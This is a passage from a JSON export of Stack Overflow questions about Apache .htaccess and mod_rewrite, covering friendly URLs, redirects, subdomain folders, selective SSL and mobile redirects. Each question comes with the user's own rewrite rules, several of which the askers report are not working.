folder /blog that has a link that passes variables to a page called \"post\".. The MySQL in the \"post.php\" page pulls the MySQL data from row that matches ID and displays that specific post.</p>\n\n<p>What I am trying to do is have a much cleaner and SEO friendly URL...</p>\n\n<p>For example:\non the \"www.mydomain.com/blog/index.php\" page they click a link like \"post?title=This%20is%20a%20test%20title%20for%20the%20blog%20post...&amp;id=1\" which takes them to the \"post.php\" page in the same directory as the \"index.php\" page in \"/blog/\"..</p>\n\n<p>Every single htaccess rewrite I have found is not changing the URL to a much friendlier version at all.. everything ends up staying the same.. </p>\n\n<p>Someone please help. I would like it to show as www.mydomain.com/blog/title rather than showing the above! If anyone could help me remove the \"%\" that appear in post titles for spaces and replace with \"-\" that would be really great too.. </p>\n\n<p>::desperate::\nThanks again, \nAdam</p>\n\n<p>Currently Using this in a htaccess file located in the \"blog/\" directory.</p>\n\n<pre><code>Options +FollowSymLinks -MultiViews\nRewriteEngine On\nRewriteBase /\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s([^.]+)\\.php [NC]\nRewriteRule ^ %1 [R=301,NC,L]\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^ %{REQUEST_URI}.php [L]\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^mydomain.com/blog/$ [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com/blog/$1 [R=301,L]\nRewriteEngine On\nRewriteRule ^([^/]*)/([^/]*)$ /post?title=$1&amp;id=$2 [QSA,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13073253,"title":"How to redirect URLs based on query string?","body":"<p>I successfully mass migrated a Wordpress site to Drupal.  Unfortunately in Wordpress, the content URL's were something like www.example.org/?p=123.  My domain is still the same, but I want to do a redirect via <code>htaccess</code> as Drupal will not allow URL's to be www.example.org/?p=123.  In other words, the content does not have the same URL as it did in Wordpress.  For example, the new Drupal URL would be something like <code>www.example.org/content/MyNewPage</code></p>\n\n<p>I tried this in my .htaccess file and it does not work</p>\n\n<pre><code>Redirect 301 /\\?p=375 http://www.example.org/content/MyNewPage\n</code></pre>\n\n<p>So I tried the below, but it does not work either.</p>\n\n<pre><code>Redirect 301 /\\?p\\=375 http://www.example.org/content/MyNewPage\n</code></pre>\n\n<p>Just as a test, I tried the below and it worked.</p>\n\n<pre><code>Redirect 301 http://www.example.org http://www.google.com\n</code></pre>\n\n<p>I made sure that my Redirect rule is at the top of the list in my .htaccess so it will be evaluated first.  How do I fix this?  </p>\n"},{"tags":[".htaccess","http","google-chrome","google","http-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13074480,"title":"http authentication issue on iframe","body":"<p>I have an HTML file with 2 links <a href=\"http://versionplus.in/pass/new.html\" rel=\"nofollow\">http://versionplus.in/pass/new.html</a>, both links are in an iframe to load the contents inside the iframe. I have two protected directories one on the same server and other on another server. If you click on either link it will popup the login box, same for both links in all browsers except google chorme. google chrome doesn't show login box for the protected folder on another server, how can I fix this ?</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13065870,"title":"How to restrict access to web page by user","body":"<p>I want to prevent the access to the entire page, the page is on the cloud becuase it is on development, im working with SEO on the page and start appearing on google.</p>\n\n<p>The page is not prepared to all people and i need to restrict the access by a simple user / pass floating form.</p>\n\n<p>I see one example in the past but dont remember how exactly what i must do.</p>\n\n<p>I remember that in htaccess i must write some line asking for the user / pass, and that lines link to a file on server that have the data. Can be something like that?</p>\n\n<p>And can i do this on a Wordprees installation?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php",".htaccess","url"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13073705,"title":"Specific conditions for rewrite rule in .htaccess","body":"<p>I previously asked a question about redirecting fake urls (member names) to a PHP file with javascript and came to conclusion that I had to use .htaccess to do this. The problem I am now face with is that I have urls that are very similiar. For example I have one url which is <code>www.mysite.com/Stream</code> and the member urls would be something like <code>www.mysite.com/JoeBloggs</code>.</p>\n\n<p>I have used this rewrite rule;</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d \nRewriteCond %{REQUEST_FILENAME}\\.php -f \nRewriteRule ^(.*)$ $1.php\n</code></pre>\n\n<p>to stop urls from having file extensions on. This leads to a problem where I need to distinguish between URLS requesting a members page and URLS requesting an actual URL. The php file that <strong>ALL</strong> members pages need to direct to is <code>members_template.php</code></p>\n\n<p>What kind of rewrite rule can I use for this or is there another, better way around it?</p>\n"},{"tags":["php",".htaccess","redirect","content-management-system","preview"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13072332,"title":"Development environment and page is under construction at the same directory","body":"<p>I want to build a new web site on an existing webspace. In the meantime I create a <code>HTML</code> page with a text like \"The page is currently under construction. It will be back soon\". Now I want to install a CMS on the same webhost. The most times I create a subdirectory and put the new website in it. But there is much effort of transfering the webpage back into the root directory (e.g. Wordpress, absolute paths, ...).</p>\n\n<p>Now I'm looking for a solution to programm the website on the root level, while other visitors are redirected to an under construction page.</p>\n\n<p>I tried it with a <code>.htaccess</code> by checking the IP address. This worked so far but than I got the problem to create a <strong>preview link</strong> for the customer. I didn't found a solution for this. I also tried it with <code>PHP</code> and using a paramter at the beginning. Than I wanted to set a session and all others without the required session parameter are redirected. That only worked for the first call. It seems that the session was not established and somehow destroyed by the CMS.</p>\n\n<p>Is there a comfortable solution which works across all CMS? This should also work for multiple domains on the same website (e.g. your-domain.com, yourdomain.com, your-domain.co.uk).</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13072128,"title":".htaccess no SSL only on home but SSL everywhere else?","body":"<p>I would like that the .htaccess don't add the SSL on the home link</p>\n\n<blockquote>\n  <p><a href=\"http://domain.com\" rel=\"nofollow\">http://domain.com</a></p>\n</blockquote>\n\n<p>but on every other links in the website</p>\n\n<blockquote>\n  <p><a href=\"https://domain.com/folder/index.html\" rel=\"nofollow\">https://domain.com/folder/index.html</a></p>\n</blockquote>\n\n<p>So only the home page would not be secure. What the best .htaccess config for that ?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","clean-urls"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":13015692,"title":"Remove %2F from URLs with mod_rewrite","body":"<p>I would like to remove the '%252F' from my dynamically created URLs.\nI have a php-file that creates links with a <code>%2F</code> instead of <code>/</code>.\nThe links are then represented in the URL-Bar as <code>%252F</code> instead of <code>/</code> which leads to some problems.<br>\nWhat I'm trying to achieve with a .htaccess-file is to redirect all <code>%2F</code> to <code>/</code> or rename all <code>%252F</code> to <code>/</code> since I can't change the php-code creating the links.<br></p>\n\n<p><strong>This is my .htaccess</strong></p>\n\n<pre><code>RewriteEngine on\nOptions +SymlinksIfOwnerMatch\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} subdomain.mydomain.com\nRewriteCond %{REQUEST_URI} (.*)/style.css [OR]\nRewriteCond %{REQUEST_URI} (.*)/script.js [OR]\nRewriteCond %{REQUEST_URI} (.*)/logo.png\nRewriteRule (.*) http://www.mydomain.com%{REQUEST_URI} [R=301,NC,L]\n\nRewriteCond %{REQUEST_METHOD}  !=POST\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /([^/]+/)*index\\.php\\ HTTP/\nRewriteRule ^(([^/]+/)*)index\\.php$ http://subdomain.mydomain.com/$1 [R=301,L]\n\nRewriteCond %{THE_REQUEST} \\ /([^\\ \\?]*)([^\\ \\?]*)%2f(\\?.*)?\\  [NC]\nRewriteRule !^/ /%1/%2 [QSA]\n\nRewriteRule ^(/.+)%2f(.*)$ $1/$2 [NC,QSA]\n\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,}\\s/+index\\.php\\?dir=([^\\s]+) [NC]\nRewriteRule ^ %1? [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?dir=/$1 [L]\n</code></pre>\n\n<p>I can't get it to work, maybe someone else can help me with this.\nThank you very much!</p>\n"},{"tags":["php","apache",".htaccess","zend-framework","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13071473,"title":"Multiple clients on the same domain separated by folder with Apache .htaccess and Zend Framework","body":"<p>I have a Zend Framework application which is implemented for several clients. Currently each client gets a separate domain with its own SSL certificate. What I'm trying to achieve is to use the same common domain and separate each client's instance of the application by a sub-folder such as below. Each sub-folder contains a completely separate instance of the ZF application. My question is, how can I achieve this with a combination of mod_rewrite, .htaccess and ZF routing in a way that ZF routing won't be affected.</p>\n\n<p><a href=\"https://www.somedomain.com/client1_app\" rel=\"nofollow\">https://www.somedomain.com/client1_app</a><br/>\n<a href=\"https://www.somedomain.com/client2_app\" rel=\"nofollow\">https://www.somedomain.com/client2_app</a><br />\n<a href=\"https://www.somedomain.com/client3_app\" rel=\"nofollow\">https://www.somedomain.com/client3_app</a></p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13070544,"title":"URLs with symbol \"%\" at the end make http error, how to prevent it with htaccess?","body":"<p>I have a doubt with some of my URLs from  my acces_log . There are some URLs from external sites linking me like <a href=\"http://domain.com/url_name.htm%\" rel=\"nofollow\">http://domain.com/url_name.htm%</a> (yes, with %).</p>\n\n<p>Then... my server returns http error, I need to redirect this fake URLs to the correct way, and I thought in htaccess.</p>\n\n<p>I only need to detect the % symbol in the last character of URL, and redirect without it.\n<a href=\"http://domain.com/url_name.htm%\" rel=\"nofollow\">http://domain.com/url_name.htm%</a> --> <a href=\"http://domain.com/url_name.htm\" rel=\"nofollow\">http://domain.com/url_name.htm</a></p>\n\n<p>How can I do this?  I was trying with some samples with ? symbol but I didn't have lucky.</p>\n\n<p>Thanks!</p>\n"},{"tags":["string","query",".htaccess","redirect","append"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13066142,"title":"htaccess Redirect if query string variable present","body":"<p>I need to add <code>style=2</code> to all urls within a directory ONLY if the url does NOT already contain <code>style=2</code>. </p>\n\n<p>Within the directory root, I have an .htaccess with the following:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} !(?style=|&amp;style=)\nRewriteRule ^(.*)$ %1&amp;style=2? [R=301,QSA]\n</code></pre>\n\n<p>I know it's wrong. Can anyone help?</p>\n"},{"tags":[".htaccess","routing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12425816,"title":"htaccess for multiple subdomains from folders","body":"<p>I am dealing with following problem:</p>\n\n<p>I have one main domain \"example.com\" and multiple subdomains:</p>\n\n<pre><code>one.example.com\ntwo.example.com\nthree.example.com\n</code></pre>\n\n<p>etc. on server.</p>\n\n<p>I have content for this subdomains in folders:</p>\n\n<pre><code>./one/    -&gt; one.example.com\n./two/    -&gt; two.example.com\n./three/  -&gt; three.example.com\n</code></pre>\n\n<p>etc.</p>\n\n<p>So to serve content from these folders to subdomains, I use following htaccess file:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST}   ^one.example.com [NC]\nRewriteCond %{REQUEST_URI} !^/one/.*\nRewriteRule   ^(.*)  /one/$1  [L]\n</code></pre>\n\n<p>It works fine, but my content for subdomains is also accessable from URL:</p>\n\n<pre><code>one.example.com/one/my-content\n</code></pre>\n\n<p>such as</p>\n\n<pre><code>one.example.com/my-content\n</code></pre>\n\n<p>etc. So it is duplicite.</p>\n\n<p>This is one problem I need to solve.</p>\n\n<p>Second is, that content for example.com is accessable from </p>\n\n<pre><code>whatever.example.com\n(a.example.com, b.example.com etc.)\n</code></pre>\n\n<p>so again duplicite.</p>\n\n<p>So my question is: how to redirect/disable URLs that are creating duplicite?</p>\n\n<p>Thanks a lot, I've tried a lot of versions of code, but with no effect.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13066650,"title":"RewriteRule multilanguage site","body":"<p>Have site with many languages\nextra  languages are in  subdomains on my server like de.mydomain.com, fr.mydomain.com.\nin these de,fr subdirectory i've placed only htaccess file with this code:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^www\\.de\\.mydomain\\.com$\nRewriteRule ^(.*)$ \"http://www.mydomain.com/$1?lan=2%1\" [L]\n</code></pre>\n\n<p>And it works but not how I want. it simply redirects from de.mydomain.com to mydomain.com, url in the browser is changing and I would like the url to stay like: de.mydomain.com but the content to be taken from mydomain.com?lan=2.(i use lan variable to change lang) </p>\n\n<p>what do I do wrong here?\nmaybe my general aproach to this problem is wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13065831,"title":"Rewrite rule conflict in htaccess file?","body":"<p>I have write rule in my htaccess file but two rules conflict each other.\nMy htaccess file is :</p>\n\n<pre><code># BEGIN REMOVE SLUG CUSTOM POST TYPE RULES\nRewriteRule ^service-status/(.+)/$ /$1 [R=301,L]\nRewriteRule ^country/(.+)/$ /$1 [R=301,L]\nRewriteRule ^company/(.+)/$ /$1 [R=301,L]\n# END REMOVE SLUG CUSTOM POST TYPE RULES\n\n\nRewriteRule ^([a-zA-Z0-9_-]+)/numero/$ ?country=$1\nRewriteRule ^introduction/([a-zA-Z0-9_-]+) ?company=$1\nRewriteRule ^pays/(.+)?$ /pays?company=$1\nRewriteRule ^([^/]*)/([^/]*)/$ /index.php?country=$1&amp;company=$2\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\n RewriteEngine On\n RewriteBase /ade/\n RewriteRule ^index\\.php$ - [L]\n RewriteCond %{REQUEST_FILENAME} !-f\n RewriteCond %{REQUEST_FILENAME} !-d\n RewriteRule . /ade/index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\nall rule working fine but \nRewriteRule ^([^/]*)/([^/]*)/$ /index.php?country=$1&amp;company=$2\nRewriteRule ^([a-zA-Z0-9_-]+)/numero/$ ?country=$1\nconflict each other both are working fine Individually   \n</code></pre>\n\n<p>I want url like \n1. <a href=\"http://abc.com/country-name/companyname/\" rel=\"nofollow\">http://abc.com/country-name/companyname/</a>   </p>\n\n<pre><code>(RewriteRule ^([^/]*)/([^/]*)/$ /index.php?country=$1&amp;company=$2)\n</code></pre>\n\n<p>2.http://abc.com/country-name/numero/ (numero is fix key word)</p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9_-]+)/numero/$ ?country=$1\n</code></pre>\n\n<p>I will appreciate your help.\nThanks \nBallu </p>\n"},{"tags":[".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1103,"score":2,"question_id":6062537,"title":".htacces rewrite rule remove \".php\" ending","body":"<p>The title explains the basics, now, here comes the problem:</p>\n\n<p>I have many files that look like this:</p>\n\n<pre><code>&lt;?php include 'mynavbar.php';   \ninclude 'myheader.php';    \ninclude 'myfirstline.php'; \ninclude 'mybuttons.php';   \ninclude 'myadvert.php'; \ninclude 'myimg.php';?&gt;\n</code></pre>\n\n<p>And I can't edit all the files and remove the <code>.php</code>. How can I not show the <code>.php</code> in the <strong>address bar</strong> but still be able to include the pages by using the <code>.php</code> ending</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13066255,"title":"rewrite url in codeigniter","body":"<p>My codeigniter website current url is www.websitename.com/fronend/deals/index/all/all.\n(note:frontend is folder inside controller, and deals is controller)</p>\n\n<p>I wants to change it to www.websitename.com/deals/ using htaccess. I had tried some code but not able to do that.Is that possible to change it using htaccess.</p>\n\n<p>Previously, I had removed the index.php from the url of my codeigniter site using following htaccess code.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L,QSA]\n</code></pre>\n\n<p>this is working fine.So I think, I needs to add some rewrite rule for this.</p>\n\n<p>could u pls explain me how to do this.Thanks</p>\n"},{"tags":[".htaccess","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13000630,"title":"Gzipping Merged JS and CSS Files in Magento","body":"<p>My Magento based store is at www.collectorsheritage.com  . Though the html and other files are getting gzipped, however the MERGED CSS AND JS files are not getting gzipped before being sent to the browser. Since the html files are getting gzipped I guess the gzip is enabled on server and is correct for the domain. S what is the problem why the merged css and js files are not getting compressed.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13065933,"title":"htaccess rewriterule redirect everypage to a single page","body":"<p>I want to redirect every url  to a single php file that will act as a dispatcher that will pull content from a DB based on the url. I am unsure what is wrong with this. Any pointers please.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nAddDefaultCharset utf-8\n\nrewriteCond %{REQUEST_URI} !(^/admin/) \nrewriteCond %{REQUEST_URI} !(\\.css$) \nrewriteCond %{REQUEST_URI} !(/robots\\.txt$) \nrewriteCond %{REQUEST_URI} !(\\.png$) \nrewriteCond %{REQUEST_URI} !(\\.jpg$) \nrewriteCond %{REQUEST_URI} !(\\.jpeg$) \nrewriteCond %{REQUEST_URI} !(\\.pdf$) \nrewriteCond %{REQUEST_URI} !(\\.gif$) \nrewriteCond %{REQUEST_URI} !(\\.GIF$) \nrewriteCond %{REQUEST_URI} !(\\.xml$) \nrewriteCond %{REQUEST_URI} !(\\.js$) \nrewriteCond %{REQUEST_URI} !(\\.ico$) \n\nRewriteRule . pageDispatcher.php   [L]  \n</code></pre>\n\n<p></p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":13,"score":-1,"question_id":13065886,"title":".htaccess rewrite issue giving 404","body":"<p>I am trying to rewrite the rule for my site which located www.mainsite.com/ask/</p>\n\n<p>I have tried to rewrite with the admin interface but it is not rewriting the url and when I check the .htaccess I found it seems okay but don't understand if something wrong. I am running wordpress site as a min site (root) and I could change permalink successfully but not for the ask site. Here is my htaccess</p>\n\n<pre><code>DirectoryIndex index.php\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /ask\nRewriteCond %{REQUEST_URI} ^(.*)//(.*)$\nRewriteRule . %1/%2 [R=301,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^.*$ index.php?qa-rewrite=$0&amp;%{QUERY_STRING} [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>This is giving me 404 on some pages like www.maindomain.com/ask/users/username  - which is giving 404</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13062928,"title":"How I can do this mod_rewrite?","body":"<p>I want to redirect all <code>http://localhost/webportal/organizations/32</code> requests to <code>http://localhost/webportal/organizations/32?qt-organization_tabs=tab1#qt-organization_tabs</code> (where 32 is a variable).</p>\n\n<p>How I can do this using mod_rewite?</p>\n\n<p><strong>Update:</strong></p>\n\n<p>I have updated the URLs above, the URLs originally posted were not correct, anyway I tried the following rule and it is not working:</p>\n\n<pre><code>RewriteRule ^/organizations/(.+)$ ^/organizations/$1?qt-organization_tabs=tab1#qt-organization_tabs [L,R]\n</code></pre>\n\n<p>All the other rules are working properly, here is the relevant part of my htaccess file (Drupal CMS):</p>\n\n<pre><code>  RewriteEngine on\n  RewriteRule \"(^|/)\\.\" - [F]\n  RewriteBase /webportal\n  RewriteRule ^/organizations/(.+)$ ^/organizations/$1?qt-organization_tabs=tab1#qt-organization_tabs [L,R]\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^ index.php [L]\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","redirect","folder","public"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":17,"score":-1,"question_id":13064190,"title":"htaccess redirect site root to public_html folder","body":"<p>When users go to foo.com/bar they should see the site located in foo.com/bar/public. The public part has to be hidden. How can I achieve this using .htaccess?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":[".htaccess","drupal","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13063186,"title":"Redirect ?q=user/register to the base url using .htaccess in Drupal 7","body":"<p>In our drupal 7 site we were not providing user registration and redirect the the user/register page to the base url using .htaccess.</p>\n\n<pre><code>#Custom redirects\n\nRewriteRule ^user/register$ http://%{HTTP_HOST} [R=301,L]\n\n#End Custom redirects\n</code></pre>\n\n<p>It is working and now I need to redirect '?q=user/register' also to that base url. When I tried with</p>\n\n<pre><code>  RewriteRule ^?q=user/register$ http://%{HTTP_HOST} [R=301,L]\n</code></pre>\n\n<p>but it was not working. Can anybody help me on this?? I need urgent help.\nThanks</p>\n"},{"tags":[".htaccess","url","friendly"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13061699,"title":"Friendly Url .htaccess","body":"<p>I have tried to follow the directions on <a href=\"http://stackoverflow.com/questions/11146062/htaccess-short-and-friendly-url\">.htaccess short and friendly url</a> but am unable to achieve these results.</p>\n\n<p>If I use the following it works fine:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([^/]*)\\.html$ /index.php?page=$1 [L]\n</code></pre>\n\n<p>However if I use:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([^/]*)$ /index.php?page=$1 [L]\n</code></pre>\n\n<p>I receive an internal server error.</p>\n\n<p>All I am trying to achieve is to be able to use <a href=\"http://website.com/about\" rel=\"nofollow\">http://website.com/about</a> instead of <a href=\"http://website.com/about.html\" rel=\"nofollow\">http://website.com/about.html</a></p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13062346,"title":"substore redirect to subdomain","body":"<p>I have a URL like below</p>\n\n<p><a href=\"http://www.abcxyz.com/storename\" rel=\"nofollow\">http://www.abcxyz.com/storename</a></p>\n\n<p>and I have sub-domain with </p>\n\n<p><a href=\"http://subdomain.adbxyz.com\" rel=\"nofollow\">http://subdomain.adbxyz.com</a></p>\n\n<p>So I want to rewrite all URLs of <a href=\"http://www.abcxyz.com/storename\" rel=\"nofollow\">http://www.abcxyz.com/storename</a> with <a href=\"http://subdomain.adbxyz.com/\" rel=\"nofollow\">http://subdomain.adbxyz.com/</a> </p>\n\n<p>How can I do this using HTACCESS? </p>\n"},{"tags":[".htaccess","url-rewriting","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":11466458,"title":"can i specify two condition in the one RewriteRule in .htaccess","body":"<p>i need below RewriteRule for the </p>\n\n<pre><code>RewriteRule .* /zencarttest/zencart/index.php [QSA,L]\n\nurl like:http://localhost/zencarttest/zencart/shirts\n</code></pre>\n\n<p>and below RewriteRule for the </p>\n\n<pre><code>RewriteRule ^(.*).html$ index\\.php?main_page=$1&amp;%{QUERY_STRING} [L]\n\nurl like: http://localhost/zencarttest/zencart/products_all.html\n</code></pre>\n\n<p>and i am try to combine both rules like this</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /zencarttest/zencart\n\n# For first url\nRewriteCond %{REQUEST_URI} !\\.[a-z]{2,5}$ [NC]\n\n\n#for second url\nRewriteCond %{REQUEST_FILENAME} !-f [NC] \nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*).html$ index\\.php?main_page=$1&amp;%{QUERY_STRING}\nRewriteRule .* /zencarttest/zencart/index.php [QSA,L]\n</code></pre>\n\n<p>i am get error when both the condition are at same time execution</p>\n\n<p>if i am run particular on condition at that time it will work perfectly but i need both of them work same time.</p>\n\n<p>Help me so my problem get solved.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13060355,"title":".htaccess redirect all sub-directories to file","body":"<p>I have been trying to find a method to redirect all directories except a few to a file with a variable</p>\n\n<p>Example:</p>\n\n<pre><code>site.com/test -&gt; index.php?a=test\n</code></pre>\n\n<p>I want all subdirectories to be forwarded except for the following</p>\n\n<pre><code>/images\n/admin\n/includes\n</code></pre>\n\n<p>I have tried the following withough success.</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/images(/|$)\nRewriteCond %{REQUEST_URI} !^/admin(/|$)\nRewriteCond %{REQUEST_URI} !^/includes(/|$)\nRewriteRule ^([\\w/]*)$ index.php/?a=$1 [L]\n</code></pre>\n\n<p>Is there a way to complete this using .htaccess</p>\n\n<p>EDIT:</p>\n\n<p>I found this which is closer to what im looking for but it needs to be updated to allow access to /images /admin /includes. </p>\n\n<pre><code>Options +FollowSymLinks -MultiViews\nRewriteEngine on\nRewriteBase /\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule (.*) index.php?a=$1  [NC,L,R=301]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13052171,"title":"htaccess rule..not able to solve","body":"<p>i am struggling to get my site htaccess work... but no luck..</p>\n\n<p>below is the code</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   Options +FollowSymLinks\n   RewriteEngine On\n   RewriteBase /\n   RewriteCond %{HTTP_HOST} ^example\\.com$ [NC] \n   RewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]\n   RewriteCond %{REQUEST_FILENAME} !-f\n   RewriteCond %{REQUEST_FILENAME} !-d \n   RewriteRule ^([^/]+)/?  /profile.php?username=$1 [L,NC]\n &lt;/IfModule&gt;\n</code></pre>\n\n<p>this works fine no issues.. but when i add something it will not work.. in following cases -</p>\n\n<p>1) For example when i type example.com/dinesh  it will redirect me to  www.example.com (always home page instead i want it to be www.example.com/dinesh</p>\n\n<p>2) now i have another users.php with two parameters the thing is when i pass one parameter it should execute this rule profile.php but when i pass two parameters then it should take me to user.php i tried so many combination but this is not working.</p>\n\n<p>if any expert can give me atleast some tips that will be great.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13049024,"title":"HTaccess dynamic URL to static rewrite that works both ways without loop","body":"<p>I have looked through stack overflow and can't find the exact answer I am looking for so here goes.</p>\n\n<p>I have a URL \n<a href=\"http://holtplantandmachinery.co.uk/cat/wheel-loaders\" rel=\"nofollow\">http://holtplantandmachinery.co.uk/cat/wheel-loaders</a> which redirects to <a href=\"http://holtplantandmachinery.co.uk/category.php?name=wheel-loaders\" rel=\"nofollow\">http://holtplantandmachinery.co.uk/category.php?name=wheel-loaders</a> </p>\n\n<p>However I need it to work the other way around when you enter the dynamic URL it rewrites to the static (folder looking) URL above and vice versa. Essentially whatever one is called it should rewrite to the static one. Now I know I need to setup a rewrite that works the opposite way to the one above and then have a condition to stop an infinite loop but I can't seem to get anything to work please help.</p>\n"},{"tags":["apache",".htaccess","smartphone"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":13039211,"title":"How do I alter my .htaccess file so that it ignores certain folders?","body":"<p>I have taken several stabs at this, but have not been able to hit on the correct syntax.  Any help would be greatly appreciated.  My .htaccess file reads as you see below.  Up until now it has been doing what it should:Redirecting all visitors on smart phones, etc. to the mobile version of my web site.  But now I need to add a command which exempts certain folders in my file manager from the effects of .htaccess.  What needs to be added to my code?</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n\n# Check if this is the noredirect query string\nRewriteCond %{QUERY_STRING} (^|&amp;)m=0(&amp;|$)\n# Set a cookie, and skip the next rule\nRewriteRule ^ - [CO=mredir:0:www.mconchicago.com]\n\nRewriteCond %{HTTP:x-wap-profile} !^$ [OR]\nRewriteCond %{HTTP:Profile}       !^$ [OR]\nRewriteCond %{HTTP_USER_AGENT} \"acs|alav|alca|amoi|audi|aste|avan|benq|bird|blac|blaz|brew|cell|cldc|cmd-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"dang|doco|eric|hipt|inno|ipaq|java|jigs|kddi|keji|leno|lg-c|lg-d|lg-g|lge-\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT}  \"maui|maxo|midp|mits|mmef|mobi|mot-|moto|mwbp|nec-|newt|noki|opwv\" [NC,OR]\nRewriteCond %{HTTP_USER_AGENT} \"palm|pana|pant|pdxg|phil|play|pluc|port|prox|qtek|qwap|sage|sams|sany\" [NC,OR]\nRewriteCond 